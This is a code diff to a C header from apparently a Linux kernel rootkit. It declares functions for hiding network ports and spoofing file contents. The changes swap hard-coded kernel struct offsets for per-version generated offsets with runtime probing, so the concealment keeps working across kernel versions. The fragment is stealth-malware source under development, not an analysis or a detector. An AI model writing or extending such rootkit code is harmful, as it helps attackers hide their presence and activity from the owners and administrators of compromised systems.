@@ -393,8 +393,8 @@ int neverc_krt_net_hide_add_port(u16 port);
 int _neverc_krt_net_port_hidden(u16 port);
 
 
-#define _NEVERC_KRT_SKC_DPORT_OFF 12
-#define _NEVERC_KRT_SKC_NUM_OFF   14
+#define _NEVERC_KRT_SKC_DPORT_OFF NEVERC_KRT_SKC_DPORT_OFF
+#define _NEVERC_KRT_SKC_NUM_OFF   NEVERC_KRT_SKC_NUM_OFF
 
 int _neverc_krt_extract_ports(void *sk, u16 *sport, u16 *dport);
 
@@ -479,8 +479,27 @@ int neverc_krt_file_spoof_add(const char *path,
 			      const char *replace, int rlen);
 
 
-#define _NEVERC_KRT_FILE_DENTRY_OFF 0x18
-#define _NEVERC_KRT_DENTRY_DNAME_NAME_OFF 0x28
+/*
+ * Struct offsets sourced from nvkmod_version.h (generated per-version by
+ * tools/gen_struct_module_offsets.c).  Runtime probing validates/overrides
+ * the compile-time hint at first use.
+ */
+#define _NEVERC_KRT_DENTRY_DNAME_NAME_OFF NEVERC_KRT_DENTRY_DNAME_OFF
+
+NEVERC_KRT_RT_VAR unsigned long _neverc_krt_file_dentry_off;
+
+int _neverc_krt_probe_file_dentry_off(void *file);
+
+
+static __always_inline unsigned long _neverc_krt_get_file_dentry_off(void)
+{
+	unsigned long off = __atomic_load_n(&_neverc_krt_file_dentry_off,
+					    __ATOMIC_ACQUIRE);
+	if (off)
+		return off;
+
+	return NEVERC_KRT_FILE_DENTRY_OFF;
+}
 
 int _neverc_krt_file_match_path(void *file, const char *target);
 
